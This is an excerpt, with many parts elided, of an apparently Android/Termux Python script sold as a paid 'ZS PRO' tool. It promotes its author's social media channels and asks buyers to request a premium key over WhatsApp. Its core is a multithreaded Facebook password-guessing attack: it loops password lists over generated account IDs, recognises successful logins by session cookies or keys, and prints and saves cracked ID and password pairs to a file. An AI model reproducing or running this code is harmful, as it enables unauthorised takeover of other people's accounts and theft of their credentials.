...
os.system('xdg-open https://youtube.com/@zamanharoonofficial4846' )
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://youtube.com/@zamanharoonofficial4846/{wx}');menu()

                        elif xd in ['7','07']:

                                os.system('xdg-open https://youtube.com/@zamanharoonofficial4846' );menu()

                        elif xd in ['8','08']:

                                os.system('xdg-open https://www.facebook.com/mhussan.hussanchandio ');menu()
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+923263278727&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi Zaman Sir, I Need To Buy Your Paid ZS PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python Zaman.py')
...
def pak():
                ...
                with tred(max_workers=30) as ZS:     
                        ...
                        for psx in user:
                                ...
                                Prince.submit(rndm,ids,passlist)
...
def bd():
                ...
                with tred(max_workers=30) as ZS:     
                        ...
                        for psx in user:
                                ...
                                Zaman.submit(rndm,ids,passlist)
...
def gmail():
                ...
                print('\033[1;37m example: shahzaman, Yaseen, Jawad, yameen\033[1;97m')
                ...
                print('\033[1;37m example: Zaman, Ayesha, Hamza \033[1;97m')
                ...
                with tred(max_workers=30) as Prince:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [ZAMAN-HAROON-VLOGS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Prince=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in Prince:
                                ...
                                print('\r\r\033[1;32m [Zaman-OK] %s | %s'%(ids,pas))
                        ...
                        elif 'checkpoint' in Prince:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [Zaman-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m [Zaman-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Zaman-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/Zaman-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [Zaman-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/Zaman-OK.txt','a').write(uid+'|'+pas+'\n')
